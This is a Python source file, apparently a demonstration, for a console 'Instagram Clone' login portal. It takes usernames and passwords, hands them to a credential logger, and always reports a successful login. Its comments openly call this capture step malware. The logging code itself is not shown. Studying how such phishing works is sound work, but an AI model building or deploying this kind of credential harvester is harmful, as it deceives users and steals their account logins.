from src.logger import CredentialLogger
 
class AuthenticationService:
    """Handles the user interface and capture of login data."""
    def __init__(self, logger: CredentialLogger):
        self.logger = logger
 
    def run_login_interface(self):
        """Presents the login screen and captures input."""
        print("\n" + "="*40)
        print("   Instagram Clone - Login Portal")
        print("="*40)
 
        while True:
            print("\n[INFO] --- Login Screen ---")
            username = input("Enter Instagram Username/Email: ").strip()
            if not username:
                print("[!] Username cannot be empty.")
                continue
 
            # This is the crucial point where the "malware" works:
            # It captures the input directly before (or instead of) verifying it.
            password = input("Enter Password: ").strip()
            if not password:
                print("[!] Password cannot be empty.")
                continue
 
            # --- Simulation of actual login/verification ---
            # In a real scenario, you would use 'requests' here to hit Instagram's API
            # For this simulation, we just log and "pass"
            print("\n[SIMULATION] Attempting to verify credentials against backend...")
 
            # 1. Capture/Malware Action
            self.logger.log_credentials(username, password)
 
            # 2. Successful login (for demonstration)
            print("\n================================================")
            print(f"✅ SUCCESS! Welcome back, {username}!")
            print("================================================")
 
            # Ask user if they want to log in again
            again = input("Login again? (y/n): ").lower()
            if again != 'y':
                break
 
        print("\n[SYSTEM] Authentication service shutting down.")
